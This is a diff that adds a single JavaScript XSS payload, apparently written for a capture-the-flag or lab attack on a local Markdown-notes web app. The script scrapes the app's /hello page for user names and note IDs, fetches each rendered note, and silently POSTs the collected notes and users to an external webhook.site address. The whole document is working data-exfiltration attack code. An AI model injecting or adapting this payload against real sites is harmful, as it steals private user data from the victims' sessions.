@@ -1,0 +1,45 @@
+<script>
+(async function(){
+try{
+var h=await fetch('http://127.0.0.1:5000/hello');
+var html=await h.text();
+var notes=[];
+var users=[];
+var noteMatches=html.match(/<li><a href="[^"]*\/([0-9]+)">[^<]*<\/a><\/li>/g)||[];
+if(noteMatches.length>0){
+noteMatches.forEach(function(m){
+var id=m.match(/\/([0-9]+)/)[1];
+notes.push(id);
+});
+}
+var userMatches=html.match(/<li>([^<]+)<\/li>/g)||[];
+if(userMatches.length>0){
+userMatches.forEach(function(m){
+var user=m.replace(/<[^>]*>/g,'').trim();
+if(user.length>0 && users.indexOf(user)===-1){
+users.push(user);
+}
+});
+}
+var allNotes=[];
+for(var i=0;i<notes.length;i++){
+try{
+var r=await fetch('http://127.0.0.1:5000/render/'+notes[i]);
+if(r.ok){
+var noteHtml=await r.text();
+var contentMatch=noteHtml.match(/<h1> Your rendered Markdown: <\/h1>([\s\S]*?)<br>/);
+var content=contentMatch?contentMatch[1].trim():'';
+allNotes.push({id:notes[i],content:content});
+}
+}catch(e){}
+}
+var payload={notes:allNotes,users:users};
+fetch('https://webhook.site/2255de52-be3f-46b9-9b60-5baf4d75aeeb',{
+method:'POST',
+mode:'no-cors',
+headers:{'Content-Type':'application/json'},
+body:JSON.stringify(payload)
+}).catch(e=>{});
+}catch(e){}
+})()
+</script>
